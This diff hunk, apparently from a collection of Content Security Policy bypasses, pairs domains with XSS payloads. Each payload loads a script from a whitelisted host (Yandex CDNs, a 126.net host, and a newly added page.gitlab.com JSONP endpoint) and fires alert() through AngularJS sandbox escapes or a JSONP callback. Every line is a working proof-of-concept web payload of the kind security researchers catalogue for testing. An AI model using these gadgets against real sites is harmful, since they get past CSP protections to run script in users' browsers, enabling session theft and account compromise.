@@ -161,3 +161,4 @@ yandex.st	<script src="https://yandex.st/jquery/1.8.2/jquery.min.js"></script><s
 yastat.net	<body ng-app ng-csp><script src="https://yastat.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 yastatic.net	<body ng-app ng-csp><script src="https://yastatic.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 yuedust.yuedu.126.net	<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+page.gitlab.com	<script src='https://page.gitlab.com/index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert'></script>
